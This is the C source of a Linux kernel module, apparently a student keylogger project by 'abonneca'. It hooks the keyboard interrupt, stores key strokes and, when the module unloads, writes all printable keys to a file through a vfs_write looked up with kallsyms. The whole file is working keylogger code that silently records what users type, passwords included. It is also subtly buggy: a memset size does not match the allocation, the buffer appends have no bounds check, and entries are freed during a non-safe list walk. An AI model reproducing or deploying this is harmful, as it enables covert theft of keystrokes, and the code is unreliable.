#include "keylog.h"

extern	struct miscdevice		keylog_dev;
extern	struct miscdevice		stats_dev;
extern	irqreturn_t keyboard_handler(int irq, void *dev_id);
extern	struct list_head head_stroke_lst;

static void write_file(struct file *filp)
{
	char			*output;
	struct s_stroke		*strokes = NULL;
	unsigned long long offset = 0;
	mm_segment_t oldfs;
	int ret;

	vfs_write_type	vfs_write =
		(void *)kallsyms_lookup_name("vfs_write");
	
	oldfs = get_fs();
	set_fs(get_ds());
	output = kmalloc(BUF_SIZE, GFP_KERNEL);
	memset(output, 0, PAGE_SIZE);
	list_for_each_entry_reverse(strokes, &head_stroke_lst, stroke_lst)
	{
		if (strokes->state == PRESSED && strokes->value != -1 &&
		    (isprint(strokes->value) || strokes->value == 13))
		{
			pr_info("%i\n", strokes->value);
				output[strlen(output)] = strokes->value == 13 ? '\n' : strokes->value;
		}
		kfree(strokes);
	}
	ret = vfs_write(filp, output, strlen(output), &offset);
	set_fs(oldfs);
	filp_close(filp, NULL);
	kfree(output);
}

struct file *file_open(const char *path, int flags, int rights) 
{
	struct file *filp = NULL;
	mm_segment_t oldfs;
	int err = 0;

	oldfs = get_fs();
	set_fs(get_ds());
	filp = filp_open(path, flags, rights);
	set_fs(oldfs);
	if (IS_ERR(filp)) {
		err = PTR_ERR(filp);
        	return NULL;
	}
	return filp;
}

static int __init keyboard_irq_init(void)
{
	int ret;

	ret = misc_register(&keylog_dev);
	if (ret < 0) 
		return -ENOMEM;
	ret = misc_register(&stats_dev);
	if (ret < 0) 
		return -ENOMEM;
	ret = request_irq(KEYBOARD_IRQ, keyboard_handler, IRQF_SHARED,
			"keyboard", (void *)keyboard_handler);
	if (ret) {
		pr_err("can't get shared interrupt for keyboard\n");
		return -1;
	}
	printk (KERN_ERR "init okay!\n");
	return 0;
}

static void __exit keyboard_irq_exit(void)
{
	struct file *		filp = NULL;

	filp = file_open(FILENAME, O_WRONLY | O_CREAT | O_TRUNC, 0644);
  	if (filp)
		write_file(filp);
//	if (keylog_dev)
		misc_deregister(&keylog_dev);
//	if (stats_dev)
		misc_deregister(&stats_dev);
	free_irq(KEYBOARD_IRQ, (void *)(keyboard_handler));
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("abonneca");
MODULE_DESCRIPTION("A keyboard irq module");

module_init(keyboard_irq_init);
module_exit(keyboard_irq_exit);
